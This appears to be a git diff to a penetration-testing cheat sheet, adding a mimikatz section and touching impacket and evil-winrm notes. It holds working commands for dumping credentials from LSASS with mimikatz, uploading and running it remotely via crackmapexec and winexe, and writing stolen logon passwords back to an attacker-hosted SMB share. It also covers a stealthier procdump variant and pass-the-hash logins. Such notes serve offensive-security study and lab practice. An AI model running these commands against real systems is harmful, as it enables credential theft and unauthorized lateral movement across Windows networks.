@@ -9,10 +9,10 @@
   - [Categories](#contents)
       - [Bug Bounty 🤖](#bugbounty)
       - [Linux 👨🏽‍💻](#linux)
-      - [Windows ](#windows)
-      - [Linux privesc 💫](#linux-privesc)
+      - [Windows 🪟](#windows)
+      - [Linux privesc 🐧](#linux-privesc)
       - [Windows privesc 😃](#windows-privesc)
-      - [Extra notes 🗒](#notes)
+      - [Extra notes 🗒](#extra-notes)
 
 
 
@@ -51,6 +51,7 @@
 ### Windows privesc
  - [metasploit](#metasploit)
     - [mimikatz_kiwi](#mimikatz-kiwi)
+ - [mimikatz](#mimikatz)
  - [impacket](#impacket)
     - [psexec](#psexec)
     - [smbexec](#smbexec)
@@ -1020,8 +1021,45 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32> 
 ```
+# mimikatz
 
-## impacket
+If you have an LSASS dump, you can use the minidump module
+```
+mimikatz # sekurlsa::minidump lsass.DMP
+```
+```
+mimikatz # sekurlsa::logonPasswords /full
+```
+* You can upload mimikatz to a remote machine with smbclient
+* Or you can use crackmapexec
+* Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.exe
+```
+crackmapexec IP -u user -p password -M mimikatz
+```
+
+* Then you can execute remotely through winexe
+
+```
+winexe -U admin%password //IP C:\\Windows\\mimikatz.exe
+```
+* Password dumping
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonPasswords /full
+```
+* In case of Mimikatz is trigerred on the target machine, you can try bring it up using network share
+```
+sudo python smbserver.py SHARE /home/xxxxx/share_path/
+```
+```
+sudo ./venv/bin/crackmapexec smb IP -u "xxx" -p "xxx" -X '\\share_ip\SHARE\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords /full" exit > \\share_ip\SHARE\mimiout_$env:computername.txt'
+```
+* In order to be stealthier, you can even do the same for procdump
+```
+sudo ./venv/bin/crackmapexec smb IP -u "xxx" -p "xxx" -X '\\share_ip\SHARE\procdump.exe "TODO"'
+```
+------------------------
+# impacket
 
 #### [github link](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_24)
 
@@ -1071,21 +1109,22 @@ python crackmapexec -u Administrator -H :011AD41795657A8ED80AB3FF6F078D03 <targe
 ### smbclient
 Browse shares via pass-the-hash:
 ```
-python smbclient.py <target_domain>/Administrator@<target_ip> -hashes 01[...]03:01[...]03
+python smbclient.py <target_domain>/Administrator@target_IP -hashes 01[...]03:01[...]03
 ```
 * a generic SMB client that will let you list shares and files, rename,
 * upload and download files and create and delete directories
 
 ```
 smbclient.py domain/user:password@IP
-smbclient.py -dc-ip 10.10.2.1 -target-ip 10.10.10.24 domain/user:password
+smbclient.py -dc-ip <attacker_IP> -target-ip <target_IP>> domain/user:password
 ```
-
+--------------------------
 ## evil-wimrm
 
 #### [github link](https://github.com/Hackplayers/evil-winrm)
 
 install with gem `sudo gem install evil-winrm`
+
 if you are using kali-linux; then it can be easily installed by `sudo apt install evil-winrm`
 
 ### Simple usage
@@ -1096,6 +1135,7 @@ evil-winrm -i <target_IP> -u <user> -p <password>
 ```
 
 * `download` & `upload` files
+
 `upload`
 ```
 upload local_filename (destination_filename)
@@ -1106,7 +1146,7 @@ download remote_filename (destination_filename)
 ```
 
 
-
+---------------------------------------------------------------------------------------------------------
 # Extra notes
 
 ### make NTML hash from password
